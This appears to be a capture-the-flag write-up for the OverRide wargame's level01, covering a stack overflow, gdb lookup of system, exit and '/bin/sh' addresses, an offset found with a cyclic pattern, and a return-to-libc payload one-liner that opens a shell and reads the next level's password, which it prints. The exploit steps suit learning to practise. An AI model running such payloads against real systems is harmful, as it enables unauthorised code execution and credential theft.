@@ -1,0 +1,96 @@
+we have program level01 
+
+it ask for a username and password to authenticate
+
+$strings ./level01
+...
+verifying username....
+dat_wil
+admin
+...
+
+so we have the username and password are "dat_wil:admin"
+
+but it doesnt work and print "nope, incorrect password..."
+
+we will try to crash the program 
+$ python -c 'print("A"*999+"\nOKOK")'| ./level01 
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+nope, incorrect username...
+
+
+
+level01@OverRide:~$ python -c 'print("dat_wil\n"+"A"*999)'| ./level01 
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password: 
+nope, incorrect password...
+
+Segmentation fault (core dumped)
+
+
+
+yes we have crashed the program we will exploit it with return to libc
+
+(gdb) find 0xf7e2b000, +9999999, "/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+(gdb) p system
+$3 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) p exit
+$4 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+
+
+
+here we have all the addresses let's find the offset
+
+
+level01@OverRide:~$ python -c 'print("dat_wil\n"+"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")'| ltrace -i ./level01
+[0x80483d1] __libc_start_main(0x80484d0, 1, -10300, 0x80485c0, 0x8048630 <unfinished ...>
+[0x8048503] puts("********* ADMIN LOGIN PROMPT ***"...********* ADMIN LOGIN PROMPT *********
+)                                                              = 39
+[0x8048510] printf("Enter Username: ")                                                                               = 16
+[0x804852d] fgets("dat_wil\n", 256, 0xf7fcfac0)                                                                      = 0x0804a040
+[0x8048478] puts("verifying username....\n"Enter Username: verifying username....
+
+)                                                                         = 24
+[0x804855c] puts("Enter Password: "Enter Password:
+)                                                                                 = 17
+[0x8048579] fgets("Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"..., 100, 0xf7fcfac0)                                            = 0xffffd6dc
+[0x80485a3] puts("nope, incorrect password...\n"nope, incorrect password...
+
+)                                                                    = 29
+[0x37634136] --- SIGSEGV (Segmentation fault) ---
+[0xffffffff] +++ killed by SIGSEGV +++
+
+
+
+here we have the offset : [0x37634136] --- SIGSEGV (Segmentation fault) ---
+
+
+
+the offset is 80
+
+
+let's exploit : 
+
+$ (python -c 'print("dat_wil\n"+"A"*80+"\xf7\xe6\xae\xd0"[::-1]+"\xf7\xe5\xeb\x70"[::-1]+"\xf7\xf8\x97\xec"[::-1])'; cat) | ./level01
+
+we use (python -c ... ... ; cat) to keep the buffer open and be able to type commands
+
+level01@OverRide:~$ (python -c 'print("dat_wil\n"+"A"*80+"\xf7\xe6\xae\xd0"[::-1]+"\xf7\xe5\xeb\x70"[::-1]+"\xf7\xf8\x97\xec"[::-1])'; cat) | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+cd ../level02
+cat .pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+
+
